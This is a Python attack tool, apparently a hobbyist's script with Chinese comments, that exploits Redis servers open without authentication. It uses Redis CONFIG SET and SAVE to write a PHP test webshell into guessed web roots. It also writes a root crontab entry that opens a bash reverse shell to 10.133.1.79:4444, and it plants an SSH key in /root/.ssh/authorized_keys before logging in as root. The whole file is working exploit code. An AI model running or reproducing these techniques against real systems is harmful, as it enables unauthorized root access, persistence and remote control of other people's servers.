#! /usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = "JrXnm"
# Date: 18-9-20

import redis
from redis.exceptions import *
import requests
import re
import traceback
import paramiko
from paramiko.ssh_exception import *
from config import webroot, config


class GetShell(object):
    def __init__(self, host, port=6379):
        self.conn = redis.Redis(host=host, port=port, decode_responses=True)
        self.host = host
        self.port = port

    def checkauth(self):
        try:
            self.conn.set('qwer', 12)
            print('[+]存在未授权访问，已经成功连接目标主机redis。')
        except ResponseError as e:
            return 0, e.args[0]
        except ConnectionError:
            return 0, 'Connection refused'
        except Exception:
            traceback.print_exc()
        return 1, 'OK'

    def getwebroot(self):
        """爆破目录绝对路径"""
        roots = []
        for pre in webroot.ALL:
            for suf in webroot.ABSPATH_SUFFIXES:
                try:
                    root = pre + '/' +suf
                    self.conn.config_set('dir', root)
                except ResponseError:
                    continue
                except Exception as e:
                    traceback.print_exc()
                    continue
                roots.append(root)

        if not roots:
            print('[-]未找到目标主机web绝对路径，写webshell方法结束')
        else:
            print('[+]找到目标主机可能web绝对路径 %s，尝试写webshell。'%str(roots))
        return roots

    def getwebport(self):
        """Todo:获取web服务端口"""
        return 80

    def examweb(self):
        port = self.getwebport()
        url = 'http://' + self.host + ':' + str(port) + '/shell.php'
        r = requests.get(url)
        pa = re.compile(r'This program is free software;.*?PHP')
        res = pa.findall(r.text)
        if res:
            return True
        else:
            return False

    def getwebshell(self):
        roots = self.getwebroot()
        ex = 0
        for root in roots:
            self.conn.config_set('dir', root)
            self.conn.config_set('dbfilename', 'shell.php')
            self.conn.set('-', '<?php phpinfo(); ?>')
            try:
                self.conn.save()
            except ResponseError:
                print('[-]没有root权限或目标redis配置不符合要求，无法save文件。')
                ex = 'noway'
                break
            ex = self.examweb() or ex
        if ex:
            print('[+]webshell成功执行，用菜刀连接试试吧')
        else:
            print('[-]webshell连接失败')

    def getcrontab(self):
        self.conn.config_set('dir', '/var/spool/cron/crontabs')
        self.conn.config_set('dbfilename', 'root')
        self.conn.set('-', '\n\n* * * * *  bash -i >& /dev/tcp/10.133.1.79/4444 0>&1\n\n')
        try:
            self.conn.save()
            print('[+]写crontab完成，请查看是否反弹shell成功。')
        except ResponseError:
            print('[-]没有root权限或目标redis配置不符合要求，无法save文件')

    def connectssh(self):

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        key = config.sshkey
        try:
            ssh.connect(self.host, 22, 'root', key)
            print('[+]ssh连接成功。')
            return True
        except AuthenticationException:
            print('[-]貌似ssh没有连接成功，也可能是用户名不为root，无法连接。')
        except NoValidConnectionsError:
            print('[-]ssh端口错误。')
        except:
            traceback.print_exc()
            print('[-]ssh连接未知错误。')
        return False

    def getssh(self):

        try:
            self.conn.config_set('dir', '/root/.ssh')
            self.conn.config_set('dbfilename', 'authorized_keys')
            self.conn.set('-', '\n\n' + config.sshkey + '\n\n')
            try:
                self.conn.save()
                self.connectssh()
            except ResponseError:
                print('[-]没有root权限或目标redis配置不符合要求，无法save文件')
        except ResponseError:
            print('[-]没有/root/.ssh目录')


if __name__ == '__main__':
    w = GetShell('192.168.246.129')
    check1 = w.checkauth()
    if not check1[0]:
        print('[-]不存在未授权访问，测试结束。')
    else:
        w.getwebshell()
        w.getssh()
        w.getcrontab()




